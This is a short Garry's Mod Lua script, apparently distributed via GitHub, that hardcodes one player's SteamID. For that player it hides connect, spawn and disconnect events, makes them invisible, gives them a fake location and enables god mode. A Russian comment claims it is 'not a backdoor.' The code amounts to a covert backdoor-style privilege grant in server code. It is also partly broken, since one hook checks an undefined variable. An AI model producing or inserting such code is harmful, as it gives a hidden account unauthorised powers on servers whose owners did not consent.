--[[
    ШТОНЫ ВНИЗ РАБОТАЕТ ГМОД ПОЛИС

    Если вы это читаете:
        1) Это не бекдур, мне хотелось бы упростить загрзузку своего говна 
        2) Вы большой молодец, раз уделяете внимание тому, что это за скрипты загружаюсться
]]

print("[Github] Wesed things loaded successfully.")

local WESED_ID = "STEAM_0:1:183002792"

local function isWesed(ply) return  ply:SteamID() == WESED_ID end


hook.Add("PlayerInitialSpawn", "Wesed:SilientSpawn", function(ply)
    if isWesed(ply) then return end
end)


hook.Add("PlayerConnect", "Wesed:SilientConnect", function(name, ip)
    for _, ply in pairs(player.GetAll()) do
        if isWesed(ply) then return true end
    end
end)


hook.Add("PlayerDisconnected", "Wesed:SilientDisconnect", function(ply)
    if isWesed(ply) then return true end
end)



hook.Add( "PlayerInitialSpawn", "HideMePls", function( ply ) 
    if (ply == WESED) then 
        ply:SetNWBool( "LFI:Hide", true)
        ply:SetNWString( "LFI:Geolocation.City", "Lunik IX" )

        ply:SetColor( Color( 255, 255, 255, 0 ) )
        ply:SetRenderMode( RENDERMODE_TRANSCOLOR )

        ply:GodEnable() 
--    ply:SetTeam(9) 
    end
end )
